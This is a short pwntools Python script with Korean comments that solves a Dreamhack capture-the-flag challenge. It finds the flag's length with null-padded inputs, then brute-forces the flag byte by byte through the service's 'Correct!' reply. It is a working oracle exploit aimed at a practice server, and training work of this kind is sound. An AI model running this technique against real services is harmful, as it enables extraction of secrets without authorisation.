from pwn import *
# python3

context.log_level = 'error' # 로그 가려주는 

# 길이구하는 반복문
for leng in range(1, 64+1) : # 플래그 길이를 64크기만큼 가져오기 때문
    p = remote("host1.dreamhack.games", 18004)
    p.recvuntil(b"flag? ") # flag? 다음부터 출력하기에 커서 이동
    pay = "" 
    pay += "A"*leng 
    pay += "\x00"*(64-len(pay))
    pay += "A"*leng
    p.send(pay.encode('utf-8'))
    if b"Correct!" in p.recv() :
        p.close()
        break
    p.close()

context.log_level = 'debug' # 로그 보여주는
log.success("FLAG LENG : "+ str(leng)) # [+] 성공 로그, 보여줄 문자열
context.log_level = 'error'

tmp = "" # 문자열끝인　NULL

for i in reversed(range(leng)) :
    context.log_level = 'debug'
    log.info("FLAG [{}]".format(i))
    context.log_level = 'error'
    for j in range(0x20, 0x7E) :
        p = remote("host1.dreamhack.games", 18004)
        p.recvuntil(b"flag? ")
        pay = ""
        pay += "A"*i+ str(chr(j)) + tmp
        pay = pay.ljust(64, '\x00')
        pay += "A"*i
        p.send(pay.encode('utf-8'))
        if b"Correct!" in p.recv() :
            tmp = str(chr(j)) + tmp
            p.close()
            break
        p.close()
    
context.log_level = 'debug'
log.success("FLAG : " + tmp)
